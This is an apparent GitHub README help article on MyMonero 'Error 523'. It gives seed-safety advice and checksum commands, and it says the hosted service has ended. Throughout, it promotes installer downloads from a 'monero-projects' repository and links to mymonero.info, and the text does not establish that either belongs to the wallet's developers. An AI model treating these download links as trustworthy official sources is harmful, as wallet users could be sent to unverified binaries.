<p align="center"><img src="https://github.com/monero-projects/learn/raw/HEAD/assets/banner-article.png" alt="MyMonero article banner" width="100%"></p>

<h1 align="center">MyMonero Error 523: What It Means and What to Try</h1>
<p align="center">Understand a server-connection error and check your wallet without risking recovery information.</p>

<p align="center">
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe"><img src="https://img.shields.io/badge/Download_for_Windows-00C6FF?style=for-the-badge&logo=windows&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Windows"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-00C6FF?style=for-the-badge&logo=apple&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for macOS"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip"><img src="https://img.shields.io/badge/Download_for_Linux-00C6FF?style=for-the-badge&logo=linux&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Linux"></a>
</p>

| Platform | File | Version |
|---|---|---|
| Windows | [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe) | v1.3.3 |
| macOS | [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg) | v1.3.3 |
| Linux | [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip) | v1.3.3 |

All versions and checksums are on the [MyMonero v1.3.3 release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3).

## Short answer
Error 523 is general guidance that the server connection is unavailable. It does not, by itself, show that your wallet or funds are gone. Check your connection, try again later, and avoid entering your seed into a page or service that promises an instant repair.


For a second walkthrough, see [MyMonero error codes on mymonero.info](https://mymonero.info/mymonero-error-codes). The site also keeps a [MyMonero download page](https://mymonero.info/github/monero-projects) and an overview of [the MyMonero FAQ](https://mymonero.info/faq).

## You'll see this if
- A MyMonero screen displays “523” while loading or trying to connect.
- A wallet-related page appears blank, times out, or cannot complete a request.
- The same attempt behaves differently on another network or at another time.
- You can open the desktop app but a hosted service or web login does not respond.

## Why it happens
A 523 message points to an unavailable server connection. It is a connection symptom, not a diagnosis of what happened to an individual wallet. A local internet interruption, a service that is not responding, or a mismatch between an old client and a service can all leave you unable to complete an online operation. This general description cannot confirm which cause applies in your case.

It is useful to distinguish the old desktop wallet from hosted access. The final MyMonero desktop release is v1.3.3. The old app still opens wallets and sends XMR, but it is no longer maintained and receives no new features or security updates. MyMonero hosted servers and web-wallet login stopped. Therefore, a failure to log into a hosted page should not be treated as evidence that your local desktop wallet has been erased.

A wallet app also needs to scan blockchain history to show current information. If a connection is unavailable, display or synchronization may be delayed. That is different from proving a transaction failed or that the seed is invalid. For related checks, see [MyMonero not syncing fix](./mymonero-not-syncing.md) and [MyMonero transaction not showing](./mymonero-transaction-not-showing.md).

---

## Fix
1. **Pause before changing anything.** Do not uninstall the wallet, delete files, or repeatedly enter recovery information while troubleshooting a connection. Keep your seed private and offline. Nobody legitimate needs you to send them your seed, private keys, or a screenshot containing them.
2. **Check ordinary connectivity.** Confirm that your device is online by visiting a service you already trust. If you use a network with a sign-in page, complete that separately. You can try another connection you control, but do not install unknown software or follow unsolicited support instructions.
3. **Restart the app and device once.** Close MyMonero normally, reopen it, and note whether the error changes. A restart can clear a temporary local network state; it cannot restore a service that is unavailable. Avoid repeated reinstall attempts as a first response.
4. **Identify which product is failing.** Is the message in the desktop app, or are you trying to use hosted web-wallet login? The old hosted login stopped, so repeatedly retrying it is not a recovery method. The desktop app and hosted access are not interchangeable.
5. **Check the release source if you need the installer.** The final desktop release is [MyMonero v1.3.3 on GitHub](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3), with Windows .exe, macOS .dmg, and Linux .zip packages. Verify a downloaded file by comparing its SHA-256 with the value shown on the release page. On Windows, `certutil -hashfile <file> SHA256` can calculate it; on macOS use `shasum -a 256 <file>`; on Linux use `sha256sum <file>`. Matching checksums are a file-integrity check, not a promise that an unavailable server is back.
6. **Consider your safe route forward.** You can keep using the MyMonero desktop app, understanding it is no longer maintained, or restore your seed in Cake Wallet. Cake Wallet runs on iOS, Android, macOS, and Linux; Windows desktop builds are paused at the time of writing. Read [MyMonero to Cake Wallet migration](./mymonero-to-cake-wallet-migration.md) before starting a move, especially if you need to understand restore height.

> [!TIP]
> Record what you observed—app or hosted page, approximate time, and whether the error repeats—without recording or sharing your seed. This makes it easier to separate connection trouble from wallet setup questions.

---

## If that did not work
Stop and preserve the state of the device and any seed backup. Do not send your seed to a person claiming to diagnose Error 523, and do not type it into a link received in chat, email, or a search advertisement. A legitimate helper does not need your seed. Be wary of “recovery” forms that ask for the words before explaining what wallet you are using.

If you have your seed and intend to restore, first identify whether it has 13 MyMonero-specific legacy words or 25 standard Monero words. Do not guess missing words or transform one format into another. The [13-word seed restore guide](./mymonero-13-word-seed-restore.md) and 25-word seed migration guide explain the distinction. A restore may require a block height from which to scan. Earlier is safer for finding older activity but takes longer; see restore height explained.

If you do not have a seed, avoid assuming that a hosted login failure can be fixed by resetting a password. The password-reset method and offline recovery of a missing seed word are not confirmed here. Keep any remaining records secure and do not disclose private keys or view keys while seeking general information. See find your MyMonero seed for cautious backup-search steps.

> [!WARNING]
> Never share your seed, private keys, or wallet backup with anyone offering to “clear” a 523 error. A seed gives access to wallet funds; treat it as secret even when a message looks official.

---

## Prevention
Keep a legible seed backup in a private, physically secure place, separate from the device. Do not put the words in public notes, screenshots, cloud documents, or support tickets. Check that you can read the backup without posting a photo anywhere. The seed backup safety guide covers safer handling.

Use only the release location above when you need the final desktop package, and compare the downloaded file’s SHA-256 against the release page. Be cautious of lookalike downloads and unsolicited “updates.” Since the desktop app no longer receives security updates, understand that limitation before deciding to keep using it. For a broader overview, read MyMonero safety considerations.

Treat connection errors as a reason to pause and verify context, not as an emergency. Never send XMR to a stranger who says a payment will repair a connection. Before moving funds, distinguish restoring a wallet from sweeping funds: sweeping sends all funds to a new wallet and is not required just because a server connection failed. See sweeping funds to a new wallet.

## FAQ
<details><summary>Does Error 523 mean my funds are lost?</summary>

No. It is general guidance that a server connection is unavailable. It does not establish the status of your wallet or funds.

</details>

<details><summary>Can I fix it by reinstalling the app?</summary>

Reinstalling is not a general fix for a server-side connection problem. First preserve your wallet information and determine whether the issue is hosted access or the desktop app.

</details>

<details><summary>Is the MyMonero hosted login still available?</summary>

MyMonero hosted servers and web-wallet login stopped. The final desktop release is v1.3.3, but it is no longer maintained.

</details>

<details><summary>Should I give support my seed to check the error?</summary>

No. Nobody legitimate asks for your seed. Keep it private and use it only in a wallet restoration process you initiated and trust.

</details>

---

## Download MyMonero

- MyMonero download page: [mymonero.info download guide](https://mymonero.info/github/monero-projects)
- Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
- macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
- Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)

Check each file against the checksums on the [MyMonero v1.3.3 release](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3) before you install it.

## Related articles

| Article | Topic |
|---|---|
| [MyMonero Error Codes List and Safe Troubleshooting](./mymonero-error-codes-list.md) | A cautious guide to interpreting wallet errors without treating every message as a lost-funds warning. |
| [MyMonero App Not Opening: Safe Checks to Try](./mymonero-app-not-opening.md) | Work through launch problems carefully while keeping recovery words and wallet data private. |
| [MyMonero App Crashes on Start: What to Check](./mymonero-app-crashes-on-start.md) | Separate an application startup crash from wallet recovery, connection, and hosted-login issues. |

[Back to all MyMonero guides](https://github.com/monero-projects/learn)
